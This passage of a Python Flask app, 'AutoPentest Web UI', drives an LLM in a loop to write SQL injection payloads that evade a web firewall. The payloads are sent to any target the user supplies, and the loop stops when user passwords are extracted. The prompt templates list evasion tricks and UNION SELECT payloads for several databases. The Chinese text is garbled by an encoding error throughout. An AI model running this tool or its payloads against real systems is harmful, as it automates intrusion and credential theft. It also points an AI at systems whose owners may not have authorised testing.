éœ€è¦ç»§ç»­å°è¯•è¯†åˆ«æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬ã€‚

âš ï¸ é‡è¦ï¼šå¿…é¡»å°è¯•ä¸å†å²è®°å½•ä¸­ä¸åŒçš„ payloadï¼
- å¦‚æœä¹‹å‰ç”¨äº†å†…è”æ³¨é‡Šï¼Œç°åœ¨å°è¯•å¤§å°å†™æ··æ·†
- å¦‚æœä¹‹å‰ç”¨äº†å¤§å°å†™æ··æ·†ï¼Œç°åœ¨å°è¯•åŒé‡ç¼–ç 
- å¦‚æœä¹‹å‰ç”¨äº†ç®€å• UNIONï¼Œç°åœ¨å°è¯• ORDER BY ç¡®å®šå­—æ®µæ•°
- å¿…é¡»ä½¿ç”¨ä¸åŒçš„ç»•è¿‡æŠ€æœ¯ç»„åˆ

å»ºè®®æŠ€æœ¯:
- ä½¿ç”¨ä¸åŒæ•°æ®åº“ç‰¹æœ‰å‡½æ•°
- å°è¯•æ›´å¤æ‚çš„ç»•è¿‡æŠ€æœ¯
- æµ‹è¯•å­—æ®µæ•°é‡: 1 ORDER BY 5/6/7
"""
                    elif sql_errors:
                        # æœ‰ SQL é”™è¯¯ï¼Œä¼˜å…ˆä¿®å¤è¯­æ³•
                        prompt += f"""**ğŸš¨ SQL é”™è¯¯ä¿®å¤é˜¶æ®µ**
æ£€æµ‹åˆ° {len(sql_errors)} æ¬¡ SQL é”™è¯¯ï¼Œéœ€è¦ä¿®å¤ payload è¯­æ³•ï¼

"""
                        if 'SQLite' in db_type:
                            prompt += """âš ï¸ å·²ç¡®è®¤ä¸º SQLite æ•°æ®åº“ï¼Œå¿…é¡»ä½¿ç”¨ SQLite è¯­æ³•ï¼

SQLite è¯­æ³•è¦ç‚¹:
- âŒ ä¸è¦ç”¨: sql(), database(), user(), version()
- âœ… åº”è¯¥ç”¨: sqlite_master, sqlite_version
- âŒ ä¸è¦ç”¨: information_schema
- âœ… åº”è¯¥ç”¨: sqlite_master WHERE type='table'
- å­—ç¬¦ä¸²è¿æ¥: ä½¿ç”¨ || ä¸æ˜¯ CONCAT
- æ³¨é‡Š: ä½¿ç”¨ -- ä¸æ˜¯ #

SQLite Payload ç¤ºä¾‹:
- è·å–è¡¨å: 1' UNION SELECT name,sql,3,4,5 FROM sqlite_master WHERE type='table'--
- è·å–ç‰ˆæœ¬: 1' UNION SELECT sqlite_version(),2,3,4,5--
- æå–æ•°æ®: 1' UNION SELECT username,password,3,4,5 FROM user--
- ç¡®å®šå­—æ®µæ•°: 1' ORDER BY 5-- (é€ä¸ªæµ‹è¯•)

âš ï¸ æ ¹æ®ä¸Šè¿°é”™è¯¯ä¿¡æ¯ï¼Œè°ƒæ•´ä½ çš„ payload ä½¿å…¶ç¬¦åˆ SQLite è¯­æ³•ï¼
"""
                        elif 'MySQL' in db_type:
                            prompt += """âš ï¸ å·²ç¡®è®¤ä¸º MySQL æ•°æ®åº“ï¼Œä½¿ç”¨ MySQL è¯­æ³•ï¼

MySQL Payload ç¤ºä¾‹:
- è·å–è¡¨å: 1' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables--
- è·å–ç‰ˆæœ¬: 1' UNION SELECT version(),2,3,4,5--
"""
                        else:
                            prompt += f"""âš ï¸ æ£€æµ‹åˆ° {db_type} æ•°æ®åº“ï¼Œè¯·ä½¿ç”¨æ­£ç¡®çš„è¯­æ³•ï¼

æ ¹æ®é”™è¯¯ä¿¡æ¯è°ƒæ•´ payload ä¸­çš„:
- å‡½æ•°åç§°ï¼ˆç¡®ä¿æ•°æ®åº“æ”¯æŒï¼‰
- ç³»ç»Ÿè¡¨åç§°ï¼ˆä¸åŒæ•°æ®åº“ä¸åŒï¼‰
- SQL è¯­æ³•è§„åˆ™
"""

                    elif db_type != 'æœªçŸ¥' and not any('password' in info for info in extracted_info):
                        prompt += f"""**é˜¶æ®µ 2/3: ç»“æ„æ¢æµ‹å’Œæ•°æ®æå–**
å·²è¯†åˆ«æ•°æ®åº“ä¸º {db_type}ï¼Œç°åœ¨éœ€è¦æå–æ•æ„Ÿæ•°æ®ã€‚

é’ˆå¯¹ {db_type} çš„å»ºè®®:
"""
                        if 'MySQL' in db_type or 'MariaDB' in db_type:
                            prompt += """- è·å–è¡¨å: 1 UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database()
- è·å–åˆ—å: 1 UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='user'
- æå–æ•°æ®: 1 UNION SELECT username,password,3,4,5 FROM user
"""
                        elif 'PostgreSQL' in db_type:
                            prompt += """- è·å–è¡¨å: 1 UNION SELECT tablename,2,3,4,5 FROM pg_tables WHERE schemaname='public'
- è·å–åˆ—å: 1 UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='user'
- æå–æ•°æ®: 1 UNION SELECT username,password,3,4,5 FROM user
"""
                        elif 'SQLite' in db_type:
                            prompt += """- è·å–è¡¨å: 1 UNION SELECT name,sql,3,4,5 FROM sqlite_master WHERE type='table'
- è·å–åˆ—ç»“æ„: 1 UNION SELECT sql,2,3,4,5 FROM sqlite_master WHERE name='user'
- è·å–ç‰ˆæœ¬: 1 UNION SELECT sqlite_version(),2,3,4,5--
- æå–æ•°æ®: 1 UNION SELECT username,password,3,4,5 FROM user--
âš ï¸ SQLite å¿…é¡»ä½¿ç”¨æ­£ç¡®çš„å‡½æ•°å: sqlite_version, sqlite_master, || ç­‰
"""
                    else:
                        prompt += """**é˜¶æ®µ 3: æ•°æ®æå–éªŒè¯**
ç»§ç»­å°è¯•ä¸åŒçš„ç»•è¿‡æŠ€æœ¯æ¥æå–æ›´å¤šæ•°æ®ã€‚

å»ºè®®:
- å°è¯• GROUP_CONCAT ä¸€æ¬¡æ€§è·å–æ‰€æœ‰æ•°æ®ï¼ˆSQLite ä½¿ç”¨ || æˆ– group_concatï¼‰
- ä½¿ç”¨ä¸åŒçš„åˆ—ç»„åˆ
- å°è¯•å…¶ä»–è¡¨çš„æ•°æ®
"""

                    prompt += """

âš ï¸ è¾“å‡ºæ ¼å¼ï¼šåªè¿”å› JSON å¯¹è±¡ {"payload":"...", "technique":"...", "explanation":"...", "stage":"..."}ï¼Œä¸è¦æ·»åŠ å…¶ä»–å†…å®¹ã€‚"""
                elif reflection_analysis:
                    # ä½¿ç”¨åæ€åˆ†æç»“æœ
                    prompt = f"""æˆæƒå®‰å…¨æµ‹è¯• - ç¬¬ {iteration} æ¬¡ SQL æ³¨å…¥ç»•è¿‡å°è¯•

## ğŸ¤” åæ€åˆ†æç»“æœ
- **WAFç‰¹å¾:** {reflection_analysis.get('waf_characteristics', 'æœªçŸ¥')}
- **å¤±è´¥åŸå› :** {reflection_analysis.get('failure_analysis', 'æœªçŸ¥')}
- **æ¨èç­–ç•¥:** {reflection_analysis.get('recommended_technique', 'æœªçŸ¥')}
- **æˆåŠŸç‡è¯„ä¼°:** {reflection_analysis.get('confidence', 'æœªçŸ¥')}
{history_summary}

## ğŸ“‹ å»ºè®®å°è¯•çš„æ–°ç­–ç•¥
{chr(10).join([f"- {s}" for s in reflection_analysis.get('new_strategies', [])])}

## ğŸ¯ ç›®æ ‡
åŸºäº WAF ç‰¹å¾ï¼Œç”Ÿæˆèƒ½å¤Ÿç»•è¿‡æ£€æµ‹å¹¶æå–æ•°æ®åº“ä¿¡æ¯çš„ payloadã€‚

è¯·åŒæ—¶å…³æ³¨ç»•è¿‡æŠ€æœ¯å’Œä¿¡æ¯æå–ï¼Œä¸è¦åªå…³æ³¨ç»•è¿‡ã€‚

âš ï¸ è¾“å‡ºæ ¼å¼ï¼šåªè¿”å› JSON å¯¹è±¡ {{"payload":"...", "technique":"...", "explanation":"...", "stage":"..."}}ï¼Œä¸è¦æ·»åŠ å…¶ä»–å†…å®¹ã€‚"""
                elif last:
                    last_response = last.get('result', {})
                    last_blocked = last_response.get('blocked', True)
                    last_waf_reason = last.get('waf_reason', '')

                    if not last_blocked:
                        # ä¸Šæ¬¡æˆåŠŸäº†ï¼Œåˆ†æå“åº”
                        last_resp_data = last_response.get('response', {})
                        prompt = f"""æˆæƒå®‰å…¨æµ‹è¯• - ç¬¬ {iteration} æ¬¡ SQL æ³¨å…¥å°è¯•

## âœ… ä¸Šä¸€æ¬¡ç»•è¿‡æˆåŠŸï¼
**Payload:** {last.get('payload', '')[:60]}...
{history_summary}

## ğŸ“¦ æœåŠ¡ç«¯å“åº”åˆ†æ
è¯·åˆ†æä»¥ä¸‹æœåŠ¡ç«¯å“åº”ï¼Œå¹¶æ®æ­¤è°ƒæ•´ä¸‹ä¸€ä¸ª payloadï¼š

å“åº”æ•°æ®:
```json
{last_resp_data}
```

## ğŸ” åˆ†æè¦ç‚¹
1. **æ•°æ®åº“æŒ‡çº¹:** å“åº”ä¸­æ˜¯å¦åŒ…å« version(), database(), user() ç­‰ä¿¡æ¯ï¼Ÿ
2. **å­—æ®µæ•°é‡:** UNION SELECT éœ€è¦å¤šå°‘ä¸ªå­—æ®µæ‰èƒ½åŒ¹é…ï¼Ÿ
3. **æ•°æ®ç»“æ„:** è¿”å›çš„æ•°æ®ç»“æ„æ˜¯ä»€ä¹ˆï¼Ÿ
4. **é”™è¯¯ä¿¡æ¯:** æ˜¯å¦æœ‰ SQL é”™è¯¯ä¿¡æ¯æš´éœ²ï¼Ÿ

## ğŸ¯ ä¸‹ä¸€æ­¥ç­–ç•¥
- å¦‚æœå“åº”åŒ…å«æ•°æ®åº“ä¿¡æ¯ â†’ æ„é€  payload æå–è¡¨ç»“æ„å’Œæ•°æ®
- å¦‚æœå“åº”å­—æ®µä¸åŒ¹é… â†’ è°ƒæ•´ UNION SELECT çš„å­—æ®µæ•°é‡
- å¦‚æœå“åº”æ­£å¸¸ä½†æ— é¢å¤–æ•°æ® â†’ å°è¯•ä¸åŒçš„æ³¨å…¥ç‚¹æˆ–æŸ¥è¯¢

âš ï¸ é‡è¦ï¼šåŸºäºä¸Šä¸€æ¬¡çš„æˆåŠŸç»éªŒï¼Œè°ƒæ•´ payload ä»¥è·å–æ›´å¤šä¿¡æ¯ï¼Œä¸è¦é‡å¤ç›¸åŒçš„æ¨¡å¼ã€‚

âš ï¸ è¾“å‡ºæ ¼å¼ï¼šåªè¿”å› JSON å¯¹è±¡ {{"payload":"...", "technique":"...", "explanation":"...", "stage":"..."}}ï¼Œä¸è¦æ·»åŠ å…¶ä»–å†…å®¹ã€‚"""
                    else:
                        # ä¸Šæ¬¡è¢«æ‹¦æˆªäº†
                        prompt = f"""æˆæƒå®‰å…¨æµ‹è¯• - ç¬¬ {iteration} æ¬¡ SQL æ³¨å…¥ç»•è¿‡å°è¯•

## âŒ ä¸Šä¸€æ¬¡è¢« WAF æ‹¦æˆª
**Payload:** {last.get('payload', '')[:60]}
**æ‹¦æˆªåŸå› :** {last_waf_reason}
{history_summary}

## ğŸ›¡ï¸ WAF æ£€æµ‹ç‰¹å¾åˆ†æ
æ ¹æ®æ‹¦æˆªåŸå› ï¼ŒWAF æ£€æµ‹åˆ°: {last_waf_reason}

## ğŸ”§ ç»•è¿‡æŠ€æœ¯å»ºè®®
âš ï¸ å¿…é¡»å°è¯•ä¸å†å²è®°å½•ä¸­å®Œå…¨ä¸åŒçš„æŠ€æœ¯ï¼
- **å¦‚æœä¹‹å‰ç”¨äº†å†…è”æ³¨é‡Š (/**/):** ç°åœ¨å°è¯•å¤§å°å†™æ··æ·†ã€åŒé‡ç¼–ç 
- **å¦‚æœä¹‹å‰ç”¨äº†å¤§å°å†™æ··æ·†:** ç°åœ¨å°è¯•å†…è”æ³¨é‡Šã€æ•°å­¦è¿ç®—ï¼ˆ1-1ä»£æ›¿ç©ºæ ¼ï¼‰
- **å¦‚æœä¹‹å‰ç”¨äº† UNION SELECT:** å°è¯•æ›´æ”¹å…³é”®å­—é¡ºåºã€ä½¿ç”¨æ³¨é‡Šç¬¦å˜ç§
- **å¦‚æœä¹‹å‰æ£€æµ‹åˆ°å‡½æ•°å:** å°è¯•æ‹†åˆ†å‡½æ•°åã€ä½¿ç”¨åå…­è¿›åˆ¶ç¼–ç 
- **å¦‚æœä¹‹å‰ç”¨äº†ç®€å•ç¼–ç :** å°è¯•åŒé‡ç¼–ç ã€Unicode ç¼–ç 

## ğŸ¯ ç›®æ ‡
ç”Ÿæˆèƒ½ç»•è¿‡ WAF å¹¶è·å–æ•°æ®åº“æŒ‡çº¹ä¿¡æ¯çš„ payloadã€‚

âš ï¸ è¾“å‡ºæ ¼å¼ï¼šåªè¿”å› JSON å¯¹è±¡ {{"payload":"...", "technique":"...", "explanation":"...", "stage":"..."}}ï¼Œä¸è¦æ·»åŠ å…¶ä»–å†…å®¹ã€‚"""
                else:
                    prompt = f"""æˆæƒå®‰å…¨æµ‹è¯• - ç¬¬ {iteration} æ¬¡ SQL æ³¨å…¥ç»•è¿‡å°è¯•

## ğŸ¯ ç›®æ ‡
é‡‡ç”¨åˆ†é˜¶æ®µç­–ç•¥ï¼Œä¼˜å…ˆè¿›è¡Œæ•°æ®åº“æŒ‡çº¹è¯†åˆ«ã€‚
{history_summary}

## ğŸ“Š æ”»å‡»é˜¶æ®µ
1. **æŒ‡çº¹è¯†åˆ«:** è·å–æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬
2. **ä¿¡æ¯æ”¶é›†:** ç¡®è®¤è¡¨ç»“æ„å’Œå­—æ®µå
3. **æ•°æ®æå–:** è·å–æ•æ„Ÿæ•°æ®

å½“å‰åº”è¯¥æ ¹æ®å‰é¢çš„å°è¯•ç»“æœé€‰æ‹©åˆé€‚çš„é˜¶æ®µã€‚

âš ï¸ é‡è¦ï¼šå¿…é¡»ç”Ÿæˆä¸å†å²è®°å½•ä¸­ä¸åŒçš„ payloadï¼Œå°è¯•æ–°çš„ç»•è¿‡æŠ€æœ¯ç»„åˆã€‚

âš ï¸ è¾“å‡ºæ ¼å¼ï¼šåªè¿”å› JSON å¯¹è±¡ {{"payload":"...", "technique":"...", "explanation":"...", "stage":"..."}}ï¼Œä¸è¦æ·»åŠ å…¶ä»–å†…å®¹ã€‚"""

            # è°ƒç”¨ LLM
            llm_response = self.call_llm(prompt, system_prompt if iteration == 1 else None)

            if not llm_response:
                continue

            # è®°å½•å®Œæ•´çš„ LLM å“åº”ç”¨äºè°ƒè¯•
            self.logger.log_step(f'iteration_{iteration}_llm_raw', {
                'full_response': llm_response,
                'response_length': len(llm_response)
            })

            # è§£æå“åº” - æ”¹è¿›çš„ JSON è§£æé€»è¾‘
            import re

            # å°è¯•å¤šç§æ–¹å¼æå– JSON
            json_match = None
            json_str = None

            # æ–¹æ³• 1: æŸ¥æ‰¾åŒ…å« payload, technique, explanation çš„å®Œæ•´ JSON
            pattern = r'\{\s*"payload"\s*:\s*"[^"]*"\s*,\s*"technique"\s*:\s*"[^"]*"\s*,\s*"explanation"\s*:\s*"[^"]*"(?:\s*,\s*"stage"\s*:\s*"[^"]*")?\s*\}'
            json_match = re.search(pattern, llm_response, re.DOTALL)

            # æ–¹æ³• 2: æŸ¥æ‰¾ä»»ä½• { ... } ç»“æ„çš„ JSON
            if not json_match:
                # ä½¿ç”¨æ›´å®½æ¾çš„æ¨¡å¼ï¼Œå…è®¸åµŒå¥—
                brace_count = 0
                start_idx = -1
                for i, char in enumerate(llm_response):
                    if char == '{':
                        if brace_count == 0:
                            start_idx = i
                        brace_count += 1
                    elif char == '}':
                        brace_count -= 1
                        if brace_count == 0 and start_idx >= 0:
                            json_str = llm_response[start_idx:i+1]
                            break

                if json_str:
                    # éªŒè¯æ˜¯å¦åŒ…å«å¿…è¦å­—æ®µ
                    if 'payload' in json_str and 'technique' in json_str:
                        json_match = type('obj', (object,), {'group': lambda self: json_str})()

            # æ–¹æ³• 3: æœ€åå°è¯•ç®€å•çš„æ­£åˆ™åŒ¹é…
            if not json_match:
                json_match = re.search(r'\{.*?\}', llm_response, re.DOTALL)

            if not json_match:
                self.logger.log_step(f'iteration_{iteration}_parse_error', {
                    'error': 'æ‰€æœ‰ JSON åŒ¹é…æ–¹æ³•éƒ½å¤±è´¥',
                    'response_preview': llm_response[:500],
                    'response_length': len(llm_response),
                    'response_first_100': llm_response[:100],
                    'contains_braces': '{' in llm_response and '}' in llm_response,
                    'contains_payload': 'payload' in llm_response,
                    'contains_technique': 'technique' in llm_response,
                    'debug_info': 'æ–¹æ³•1(ç²¾ç¡®åŒ¹é…)ã€æ–¹æ³•2(æ‹¬å·è®¡æ•°)ã€æ–¹æ³•3(ç®€å•æ­£åˆ™) å…¨éƒ¨å¤±è´¥'
                })
                continue

            try:
                extracted_json = json_match.group(0)
                llm_data = json.loads(extracted_json)

                payload = llm_data.get('payload', '')
                technique = llm_data.get('technique', 'Unknown')
                explanation = llm_data.get('explanation', '')

                # éªŒè¯å¿…è¦å­—æ®µ
                if not payload:
                    self.logger.log_step(f'iteration_{iteration}_parse_error', {
                        'error': 'payload å­—æ®µä¸ºç©º',
                        'extracted_json': extracted_json,
                        'llm_data_keys': list(llm_data.keys())
                    })
                    continue

                # è®°å½•è§£æç»“æœ
                self.logger.log_step(f'iteration_{iteration}_parsed', {
                    'payload': payload,
                    'technique': technique,
                    'explanation': explanation,
                    'based_on_reflection': reflection_analysis is not None
                })

            except json.JSONDecodeError as e:
                self.logger.log_step(f'iteration_{iteration}_parse_error', {
                    'error': f'JSON è§£æå¤±è´¥: {str(e)}',
                    'extracted_json': json_match.group(0)[:500] if json_match else 'None',
                    'full_response': llm_response[:500],
                    'error_pos': e.pos if hasattr(e, 'pos') else 'unknown'
                })
                continue
            except Exception as e:
                self.logger.log_step(f'iteration_{iteration}_parse_error', {
                    'error': f'è§£æå¼‚å¸¸: {type(e).__name__}: {str(e)}',
                    'extracted_json': json_match.group(0)[:300] if json_match else 'None'
                })
                continue

            # ç¡®ä¿ payload å˜é‡åœ¨ä½œç”¨åŸŸå†…
            if not payload:
                self.logger.log_step(f'iteration_{iteration}_parse_error', {
                    'error': 'payload è§£æåä¸ºç©º',
                    'llm_response_preview': llm_response[:300]
                })
                continue

            # æµ‹è¯• payload
            test_result = self._test_payload(endpoint, param_name, payload, method)

            # HTTP è¯·æ±‚å’Œå“åº”è¯¦æƒ…
            response_data = test_result.get('response', {})
            http_details = {
                'payload': payload,
                'technique': technique,
                'waf_blocked': test_result.get('blocked', False),
                'waf_reason': test_result.get('waf_reason', ''),
                'status_code': test_result.get('status_code', 0),
                'has_data': len(response_data.get('data', [])) > 0,
                'data_count': len(response_data.get('data', [])),
                'error': response_data.get('error', '')[:200] if response_data.get('error') else None,
                # HTTP è¯·æ±‚è¯¦æƒ…
                'http_request': {
                    'url': test_result.get('url', ''),
                    'full_url': test_result.get('full_url', ''),
                    'method': method,
                    'param_name': param_name,
                    'param_value': payload
                },
                # HTTP å“åº”è¯¦æƒ…
                'http_response': {
                    'status_code': test_result.get('status_code', 0),
                    'success': response_data.get('success', True),
                    'data': response_data.get('data', []),
                    'error': response_data.get('error', ''),
                    'query': response_data.get('query', ''),
                    'has_waf_stats': 'waf_stats' in test_result
                }
            }

            self.logger.log_step(f'iteration_{iteration}_test', http_details)

            # å•ç‹¬è®°å½• HTTP è¯·æ±‚å’Œå“åº”çš„è¯¦ç»†æ—¥å¿—ï¼ˆä¾¿äºå‰ç«¯å±•ç¤ºï¼‰
            self.logger.log_step(f'iteration_{iteration}_http', {
                'request': {
                    'method': method,
                    'url': test_result.get('url', ''),
                    'full_url': test_result.get('full_url', ''),
                    'param_name': param_name,
                    'payload': payload
                },
                'response': {
                    'status_code': test_result.get('status_code', 0),
                    'body': response_data,
                    'waf_blocked': test_result.get('blocked', False),
                    'waf_reason': test_result.get('waf_reason', '')
                }
            })

            self.attempt_history.append({
                'payload': payload,
                'technique': technique,
                'iteration': iteration,
                'result': test_result,
                'waf_reason': test_result.get('waf_reason', 'Unknown'),
                'success': not test_result['blocked']
            })

            # åˆ¤æ–­æ˜¯å¦æˆåŠŸ
            injection_success = False
            success_reason = ""

            if not test_result['blocked']:
                response_data = test_result.get('response', {})
                data_list = response_data.get('data', [])

                # ç¡®ä¿ data_list æ˜¯åˆ—è¡¨
                if not isinstance(data_list, list):
                    data_list = []

                # è®°å½•å“åº”åˆ†æç”¨äºè°ƒè¯•
                self.logger.log_step(f'iteration_{iteration}_response_analysis', {
                    'data_count': len(data_list),
                    'data_list_type': type(data_list).__name__,
                    'data_preview': data_list[:2] if data_list else [],
                    'response_keys': list(response_data.keys()) if isinstance(response_data, dict) else [],
                    'first_item_type': type(data_list[0]).__name__ if data_list else 'empty',
                    'first_item': data_list[0] if data_list else None
                })

                # æ£€æŸ¥æ˜¯å¦æå–åˆ°äº†é¢å¤–çš„æ•°æ®ï¼ˆUNION æ³¨å…¥æˆåŠŸçš„æ ‡å¿—ï¼‰
                try:
                    if len(data_list) > 1:
                        injection_success = True
                        success_reason = f"æˆåŠŸæå– {len(data_list)} æ¡æ•°æ®"

                        # æ£€æŸ¥æ˜¯å¦åŒ…å«æ•æ„Ÿä¿¡æ¯
                        sensitive_found = False
                        for idx, item in enumerate(data_list):
                            try:
                                if not isinstance(item, dict):
                                    self.logger.log_step(f'iteration_{iteration}_debug_item_{idx}', {
                                        'warning': f'Item {idx} is not a dict',
                                        'item_type': type(item).__name__,
                                        'item_value': str(item)[:100]
                                    })
                                    continue

                                item_str = str(item)
                                # æ£€æŸ¥æ˜¯å¦åŒ…å«å¯†ç å­—æ®µ
                                if 'password' in item and item.get('password'):
                                    password_value = item.get('password')
                                    # å®‰å…¨åœ°è·å–å¯†ç å€¼çš„å‰20ä¸ªå­—ç¬¦
                                    password_str = str(password_value)[:20] if password_value else ''
                                    sensitive_found = True
                                    success_reason = f"æˆåŠŸæå–å¯†ç : {password_str}..."
                                    break
                                # æ£€æŸ¥æ˜¯å¦åŒ…å« group_concat çš„ç»“æœ
                                if item.get('username'):
                                    username_value = item.get('username')
                                    username_str = str(username_value) if username_value else ''
                                    if ':' in username_str:
                                        sensitive_found = True
                                        success_reason = f"æˆåŠŸæå–åˆå¹¶æ•°æ®: {username_str[:50]}..."
                                        break
                                # æ£€æŸ¥ field_X æ ¼å¼ï¼ˆUNION æ³¨å…¥çš„å‡½æ•°ç»“æœï¼‰
                                field_keys = [k for k in item.keys() if k.startswith('field_')]
                                if field_keys:
                                    # æ£€æŸ¥ field_0 çš„å€¼æ˜¯å¦åŒ…å«æ•°æ®åº“ä¿¡æ¯
                                    field_0_value = str(item.get('field_0', ''))
                                    if any(x in field_0_value.lower() for x in ['version', 'mysql', 'postgresql', 'sqlite', 'mariadb', 'root@', 'localhost']):
                                        sensitive_found = True
                                        success_reason = f"æˆåŠŸæå–æ•°æ®åº“ä¿¡æ¯: {field_0_value[:50]}..."
                                        break
                                    # æ£€æŸ¥æ˜¯å¦æ˜¯å‡½æ•°è°ƒç”¨çš„ç»“æœ
                                    if any(x in field_0_value for x in ['()', '@', '.', ':']):
                                        sensitive_found = True
                                        success_reason = f"æˆåŠŸæ‰§è¡Œ SQL å‡½æ•°: {field_0_value[:50]}..."
                                        break
                            except Exception as e:
                                self.logger.log_step(f'iteration_{iteration}_debug_item_error_{idx}', {
                                    'error': f'Error processing item {idx}: {str(e)}',
                                    'item_type': type(item).__name__
                                })
                                continue

                        if sensitive_found:
                            success_reason = "âœ… æˆåŠŸæå–æ•æ„Ÿæ•°æ®ï¼"

                    elif len(data_list) == 1:
                        # å•æ¡æ•°æ®ï¼Œæ£€æŸ¥æ˜¯å¦æ˜¯æ³¨å…¥çš„ç»“æœ
                        item = data_list[0]
                        if isinstance(item, dict):
                            # æ£€æŸ¥æ˜¯å¦æœ‰éæ­£å¸¸çš„å­—æ®µï¼ˆå¦‚ version, database ç­‰ï¼‰
                            item_str = str(item)
                            if 'version' in item_str or 'database' in item_str or 'user()' in item_str:
                                injection_success = True
                                success_reason = "æˆåŠŸæ‰§è¡Œæ•°æ®åº“ä¿¡æ¯æå–"

                            # æ£€æŸ¥æ˜¯å¦æœ‰ field_X æ ¼å¼çš„æ•°æ®ï¼ˆUNION æ³¨å…¥ä½†åªè¿”å›ä¸€è¡Œï¼‰
                            try:
                                field_keys = [k for k in item.keys() if k.startswith('field_')]
                                if field_keys:
                                    injection_success = True
                                    field_0_value = item.get('field_0', '')
                                    # å®‰å…¨åœ°è½¬æ¢ä¸ºå­—ç¬¦ä¸²å¹¶åˆ‡ç‰‡
                                    field_0_str = str(field_0_value)[:50] if field_0_value is not None else ''
                                    success_reason = f"UNION æ³¨å…¥æˆåŠŸï¼Œæå–åˆ°: {field_0_str}..."
                            except Exception as e:
                                # å­—å…¸é”®è®¿é—®å¯èƒ½å‡ºé”™ï¼Œè®°å½•ä½†ä¸ä¸­æ–­
                                self.logger.log_step(f'iteration_{iteration}_single_item_error', {
                                    'error': f'Error processing single item: {str(e)}',
                                    'item_type': type(item).__name__
                                })
                except Exception as e:
                    import traceback
                    self.logger.log_step(f'iteration_{iteration}_data_processing_error', {
                        'error': str(e),
                        'error_type': type(e).__name__,
                        'traceback': traceback.format_exc()[:500],
                        'data_list_length': len(data_list) if isinstance(data_list, list) else 'not_list'
                    })
                    # å‘ç”Ÿé”™è¯¯æ—¶ï¼Œå°† injection_success è®¾ä¸º False ä»¥é˜²ä¸­æ–­æµç¨‹
                    injection_success = False

            if injection_success:
                self.logger.log_step('scan_end', {
                    'success': True,
                    'attempts': iteration,
                    'reason': success_reason
                })
                return {'success': True, 'iterations': iteration, 'reason': success_reason}

        self.logger.log_step('scan_end', {
            'success': False,
            'attempts': max_iterations
        })
        return {'success': False, 'iterations': max_iterations}


def run_waf_bypass(test_id, target, endpoint, max_iterations=5):
    """åœ¨åå°è¿è¡Œ WAF ç»•è¿‡æµ‹è¯•"""
    logger = WebUILogger(test_id)
    tests[test_id] = logger

    try:
        # è®°å½•åˆå§‹åŒ–ä¿¡æ¯
        logger.log_step('init', {
            'target': target,
            'endpoint': endpoint,
            'llm_model': 'glm-4-flash',
            'mode': 'waf-bypass',
            'max_iterations': max_iterations
        })

        # åˆ›å»º WAF ç»•è¿‡è¿è¡Œå™¨
        runner = WAFBypassRunner(target, logger)

        # è¿è¡Œç»•è¿‡æµ‹è¯•
        result = runner.bypass_waf(
            endpoint=endpoint,
            param_name='id',
            param_value='1',
            method='GET',
            max_iterations=max_iterations
        )

        logger.complete(success=result.get('success', False))

    except Exception as e:
        logger.log_step('error', {'message': str(e)})
        logger.complete(success=False)


@app.route('/')
def index():
    return render_template('pentest-ui-simple.html')


@app.route('/api/pentest/start', methods=['POST'])
def start_test():
    data = request.json
    target = data.get('target')
    endpoint = data.get('endpoint', '/api/protected/user')
    max_iterations = data.get('max_iterations', 5)  # è·å–æœ€å¤§è¿­ä»£æ¬¡æ•°ï¼Œé»˜è®¤ä¸º 5

    if not target:
        return jsonify({'error': 'è¯·æä¾›ç›®æ ‡åœ°å€'}), 400

    # ç”Ÿæˆæµ‹è¯• ID
    test_id = f"test_{uuid.uuid4().hex[:8]}"

    # åœ¨åå°çº¿ç¨‹è¿è¡Œæµ‹è¯•
    thread = threading.Thread(
        target=run_waf_bypass,
        args=(test_id, target, endpoint, max_iterations)  # ä¼ é€’ max_iterations
    )
    thread.daemon = True
    thread.start()

    return jsonify({
        'success': True,
        'test_id': test_id,
        'status': 'started',
        'message': 'æµ‹è¯•å·²å¯åŠ¨',
        'max_iterations': max_iterations  # è¿”å›å®é™…ä½¿ç”¨çš„æœ€å¤§è¿­ä»£æ¬¡æ•°
    })


@app.route('/api/pentest/status/<test_id>')
def get_status(test_id):
    if test_id not in tests:
        return jsonify({'error': 'æµ‹è¯•ä¸å­˜åœ¨'}), 404

    logger = tests[test_id]

    return jsonify({
        'success': True,
        'test_id': test_id,
        'status': logger.status,
        'start_time': logger.start_time,
        'end_time': logger.end_time,
        'events': logger.events,
        'total_events': len(logger.events)
    })


if __name__ == '__main__':
    print("""
============================================================
 AutoPentest Web UI
============================================================

è®¿é—®åœ°å€: http://localhost:5001

åŠŸèƒ½:
- Web UI ç•Œé¢è¿›è¡Œæ¸—é€æµ‹è¯•
- å®æ—¶æ˜¾ç¤ºæµ‹è¯•è¿‡ç¨‹
- HTTP æŠ¥æ–‡è¯¦ç»†å±•ç¤º
- LLM åˆ†æå¯è§†åŒ–

æŒ‰ Ctrl+C åœæ­¢æœåŠ¡
============================================================
    """)

    app.run(host='0.0.0.0', port=5001, debug=True)
